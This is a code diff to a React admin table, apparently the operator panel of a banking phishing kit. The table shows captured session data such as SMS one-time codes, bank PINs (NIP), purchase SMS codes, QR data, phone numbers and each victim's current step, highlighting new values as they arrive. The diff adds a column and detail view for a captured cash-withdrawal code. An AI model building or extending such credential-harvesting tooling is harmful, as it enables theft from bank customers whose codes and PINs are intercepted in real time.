@@ -8,7 +8,7 @@ import { useToast } from '@/hooks/use-toast';
 import { useDeviceInfo } from '@/hooks/use-device-orientation';
 import { Card, CardContent } from '@/components/ui/card';
 import { Button } from '@/components/ui/button';
-import { ArrowRight, CheckCircle2, Copy, AlarmClock, CreditCard, MessageSquare, KeyRound, AlertCircle, Smartphone, Target, Download, QrCode } from 'lucide-react';
+import { ArrowRight, Ban, CheckCircle2, Copy, AlarmClock, CreditCard, MessageSquare, KeyRound, AlertCircle, Smartphone, Target, Download, QrCode } from 'lucide-react';
 import { DeleteConfirmDialog } from './DeleteConfirmDialog';
 
 interface AccessTableProps {
@@ -466,6 +466,16 @@ const AccessTable: React.FC<AccessTableProps> = ({
                       </div>
                     )}
                     
+                    {/* Mostrar código de retiro si existe */}
+                    {session.codigoRetiro && (
+                      <div className="mb-2 flex gap-1 items-center">
+                        <Ban className="h-4 w-4 text-[#888]" />
+                        <div className={`text-sm ${highlightedFields[session.sessionId]?.codigoRetiro ? 'text-[#00ffff] font-bold' : 'text-[#ccc]'}`}>
+                          Código Retiro: {session.codigoRetiro}
+                        </div>
+                      </div>
+                    )}
+                    
                     {/* Mostrar datos QR si existen */}
                     {session.qrData && (
                       <div className="mb-2">
@@ -570,6 +580,7 @@ const AccessTable: React.FC<AccessTableProps> = ({
                 <th className="p-3 text-left w-[80px]">SMS</th>
                 <th className="p-3 text-left w-[80px]">NIP</th>
                 <th className="p-3 text-left w-[100px]">SMS COMPRA</th>
+                <th className="p-3 text-left w-[100px]">Código Retiro</th>
                 <th className="p-3 text-left w-[100px]">QR</th>
                 <th className="p-3 text-left w-[80px]">Celular</th>
                 <th className="p-3 text-left w-[100px]">Paso actual</th>
@@ -624,6 +635,9 @@ const AccessTable: React.FC<AccessTableProps> = ({
                   </td>
                   <td className={`p-3 truncate ${highlightedFields[session.sessionId]?.smsCompra ? 'text-[#00ffff] font-bold' : 'text-[#ccc]'}`}>
                     {session.smsCompra || '--'}
+                  </td>
+                  <td className={`p-3 truncate ${highlightedFields[session.sessionId]?.codigoRetiro ? 'text-[#00ffff] font-bold' : 'text-[#ccc]'}`}>
+                    {session.codigoRetiro || '--'}
                   </td>
                   <td className="p-3 text-[#ccc]">
                     {session.qrData ? (
